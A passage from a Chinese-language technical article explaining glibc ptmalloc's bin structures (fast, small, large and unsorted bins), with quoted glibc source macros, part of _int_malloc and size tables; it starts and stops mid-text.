bin）外，后面的每个 bin 的表头 chunk 会重用前面的 bin 表头 chunk 的 fd 与 bk 字段，将其视为其自身的 prev_size 和 size 字段。这里也说明了一个问题，<strong>bin 的下标和我们所说的第几个 bin 并不是一致的。同时，bin 表头的 chunk 头节点 的 prev_size 与 size 字段不能随便修改，因为这两个字段是其它 bin 表头 chunk 的 fd 和 bk 字段。</strong></p><p>数组中的 bin 依次介绍如下</p><ol><li>（索引）第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li><li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ol><blockquote><p>在 <code>glibc</code> 中用于记录 <em>bin</em> 的数据结构有两种，分别为：</p><ul><li><code>fastbinsY</code>: 这是一个数组，用于记录所有的 <em>fast bin</em></li><li><code>bin</code> 数组: 这也是一个数组，用于记录除 <em>fast bin</em> 之外的所有 <em>bin</em> 。事实上这个数组共有 126 个元素，分别是:<ul><li><code>[1]</code> 为 <em>unsorted bin</em></li><li><code>[2~63]</code> 为 <em>small bin</em></li><li><code>[64~126]</code> 为 <em>large bin</em></li></ul></li></ul><p>回顾 <code>malloc_chunk</code> 的数据结构，其中的 <code>fd</code> 和 <code>bk</code> 指针就是指向当前 <em>chunk</em> 所属的链表中 <code>forward chunk</code> 或者 <code>backward chunk</code>，<strong>因此一般的 bin 是一个双向链表</strong>（有例外）。</p></blockquote><p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。</p><p>需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong></p><p>bin 通用的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i)                                                           \</span></span><br><span class="line">    (mbinptr)(((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[ ((i) <span class="number">-1</span>) * <span class="number">2</span> ])) -                        \</span><br><span class="line">              offsetof(struct malloc_chunk, fd))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="comment">//获取下一个bin的地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="comment">// 这两个宏可以用来遍历bin</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表头的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b) ((b)-&gt;fd)</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表尾的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b) ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><h4 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h4><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。<strong>因为我们把大部分时间花在了合并、分割以及中间检查的过程中。</strong>因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Fastbins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An array of lists holding recently freed small chunks.  Fastbins</span></span><br><span class="line"><span class="comment">    are not doubly linked.  It is faster to single-link them, and</span></span><br><span class="line"><span class="comment">    since chunks are never removed from the middles of these lists,</span></span><br><span class="line"><span class="comment">    double linking is not necessary. Also, unlike regular bins, they</span></span><br><span class="line"><span class="comment">    are not even processed in FIFO order (they use faster LIFO) since</span></span><br><span class="line"><span class="comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="comment">    fastbins are normally used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This is in malloc_state.</span></span><br><span class="line"><span class="comment">    /* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>为了更加高效地利用 fast bin，glibc 采用<strong>单向链表</strong>对其中的每个 bin 进行组织(只使用 <code>fd</code> 指针)，并且<strong>每个 bin 采取 LIFO 策略（后进先出）</strong>，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。也就是说，当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc 才会做接下来的一系列操作。</p><blockquote><p><em>fast bin</em> 中无论是添加还是移除 <em>fast chunk</em>，都是对“链表尾”进行操作，而不会对某个中间的 <em>fast chunk</em> 进行操作。</p></blockquote><p><img src="img%5Cfast-bin.png" alt="fast bin"></p><p>默认情况下（<strong>32 位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， <strong>fastbin 最多可以支持的 bin 的个数为 10 个</strong>，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小）定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Since the lowest 2 bits in max_fast don&#x27;t matter in size comparisons,</span></span><br><span class="line"><span class="comment">   they are used as flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//判断分配区是否有 fast bin chunk，1表示没有</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// MORECORE是否返回连续的内存区域。</span></span><br><span class="line"><span class="comment">// 主分配区中的MORECORE其实为sbr()，默认返回连续虚拟地址空间</span></span><br><span class="line"><span class="comment">// 非主分配区使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</span></span><br><span class="line"><span class="comment">// 而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks.</span></span><br><span class="line"><span class="comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s)                                                        \</span></span><br><span class="line">    global_max_fast =                                                          \</span><br><span class="line">        (((s) == <span class="number">0</span>) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure><p>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 chunk 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fastbin 。</p><blockquote><p>那么 <code>malloc</code> 操作具体如何处理 <em>fast chunk</em> 呢？</p><p>当用户通过 <code>malloc</code> 请求的大小属于 <em>fast chunk</em> 的大小范围（注意：用户请求 size 加上 16 字节就是实际内存 <em>chunk size</em>）。在初始化的时候 <em>fast bin</em> 支持的最大内存大小以及所有 <em>fast bin</em> 链表都是空的，所以当最开始使用 <code>malloc</code> 申请内存的时候，即使申请的内存大小属于 <em>fast chunk</em> 的内存大小（即 16 到 80 字节），它也不会交由 <em>fast bin</em> 来处理，而是向下传递交由 <em>small bin</em> 来处理，如果 <em>small bin</em> 也为空的话就交给 <em>unsorted bin</em> 处理。那么 <em>fast bin</em> 是在哪？怎么进行初始化的呢？</p><p>当我们第一次调用 <code>malloc</code> 的时候，系统执行 <code>_int_malloc</code> 函数，该函数首先会发现当前 <em>fast bin</em> 为空，就转交给 <em>small bin</em> 处理，进而又发现 <em>small bin</em> 也为空，就调用 <code>malloc_consolidate</code> 函数对 <code>malloc_state</code> 结构体进行初始化，<code>malloc_consolidate</code> 函数主要完成以下几个功能：</p><ul><li>首先判断当前 <code>malloc_state</code> 结构体中的 <em>fast bin</em> 是否为空，如果为空就说明整个 <code>malloc_state</code> （<em>arena</em>）都没有完成初始化，需要对 <code>malloc_state</code> 进行初始化。</li><li><code>malloc_state</code> 的初始化操作由函数 <code>malloc_init_state(av)</code> 完成，该函数先初始化除 <em>fast bin</em> 之外的所有的 <em>bin</em> (构建双链表，详情见后文<code>small bins</code>介绍)，再初始化 <em>fast bins</em>。</li><li>当再次执行 <code>malloc</code> 函数的时候，此时 <em>fast bin</em> 相关数据不为空了，就开始使用 <em>fast bin</em>，这部分代码如下：</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// …</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//第一次执行malloc(fast chunk)时这里判断为false，因为此时get_max_fast ()为0</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// use fast bin</span></span><br><span class="line">      idx = fastbin_index (nb);     </span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// remove chunk from fast bin    </span></span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))!= victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>得到第一个来自于 <em>fast bin</em> 的 <em>chunk</em> 之后，系统就将该 <em>chunk</em> 从对应的 <em>fast bin</em> 中移除，并将其地址返回给用户。</p></blockquote><p><strong>fastbin 的索引</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>需要特别注意的是，fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong></p><p>但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure><p><strong>malloc_consolidate 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。具体地参见后续的详细函数的分析。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h4 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h4><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p><table><thead><tr><th align="center">下标</th><th align="center">SIZE_SZ=4（32 位）</th><th align="center">SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td align="center">2</td><td align="center">16</td><td align="center">32</td></tr><tr><td align="center">3</td><td align="center">24</td><td align="center">48</td></tr><tr><td align="center">4</td><td align="center">32</td><td align="center">64</td></tr><tr><td align="center">5</td><td align="center">40</td><td align="center">80</td></tr><tr><td align="center">x</td><td align="center">2*4*x</td><td align="center">2*8*x</td></tr><tr><td align="center">63</td><td align="center">504</td><td align="center">1008</td></tr></tbody></table><p>small bins 中一共有 62 个<strong>循环双向链表，每个链表中存储的 chunk 大小都一致</strong>。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong>（先进先出），所以同一个链表中先被释放的 chunk 会先被分配出去。<strong>物理地址相邻的 <em>free chunk</em> 需要进行合并操作，即合并成一个大的 <em>free chunk</em></strong> 。</p><blockquote><p>当释放 <em>small chunk</em> 的时候，先检查该 <em>chunk</em> 相邻的 <em>chunk</em> 是否为 <em>free chunk</em>，如果是的话就进行合并操作：将这些 <em>chunk</em> 合并成新的 <em>chunk</em> ，然后将它们从 <em>small bin</em> 中移除，最后将新的 <em>chunk</em> 添加到 <em>unsorted bin</em> 中。</p></blockquote><p>small bin 相关的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment">// 是否需要对small bin的下标进行纠正</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"><span class="comment">//判断chunk的大小是否在small bin范围内</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)                                                  \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">// 根据chunk的大小得到small bin对应的索引。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz)                                                     \</span></span><br><span class="line">    ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>)                          \</span><br><span class="line">                           : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>)) +                       \</span><br><span class="line">     SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure><p><strong>或许，大家会很疑惑，那 fastbin 与 small bin 中 chunk 的大小会有很大一部分重合啊，那 small bin 中对应大小的 bin 是不是就没有什么作用啊？</strong> 其实不然，fast bin 中的 chunk 是有可能被放到 small bin 中去的，我们在后面分析具体的源代码时会有深刻的体会。</p><h4 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h4><p>large bins 中一共包括 63 个 bin，<strong>每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内</strong>。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><p>这里我们以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)。</p><p>关于 large bin 的宏如下，这里我们以 32 位平台下，第一个 large bin 的起始 chunk 大小为例，为 512 字节，那么 512&gt;&gt;6 = 8，所以其下标为 56+8=64。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 